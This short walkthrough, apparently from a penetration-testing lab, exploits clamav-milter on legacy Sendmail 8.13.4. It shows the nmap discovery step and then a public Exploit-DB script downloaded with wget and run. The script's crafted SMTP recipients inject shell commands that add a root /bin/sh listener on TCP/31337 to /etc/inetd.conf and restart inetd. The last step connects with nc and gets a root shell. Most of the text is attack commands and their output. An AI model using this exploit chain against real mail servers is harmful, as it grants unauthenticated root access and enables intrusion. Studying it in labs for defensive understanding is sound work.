# ClamAV Milter with Sendmail

A legacy Sendmail service using clamav-milter can expose unauthenticated remote root command execution over SMTP.

## Discovery

Run service/version detection against TCP/25 and note the exact Sendmail version:

```bash
nmap -sC -sV -p25 TARGET
```

Observed vulnerable service:

```text
25/tcp open  smtp  Sendmail 8.13.4/8.13.4/Debian-3sarge3
```

## Remote Root Exploit

Exploit-DB 4761 sends crafted SMTP recipients that append a root shell service to `/etc/inetd.conf` and restart inetd:

```bash
wget https://www.exploit-db.com/raw/4761
perl 4761 TARGET
```

Successful SMTP responses include acceptance of both crafted recipients and the message:

```text
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
250 2.0.0 Message accepted for delivery
```

Connect to the new service on TCP/31337:

```bash
nc TARGET 31337
id
# uid=0(root) gid=0(root) groups=0(root)
```

## Reference

- https://www.exploit-db.com/exploits/4761
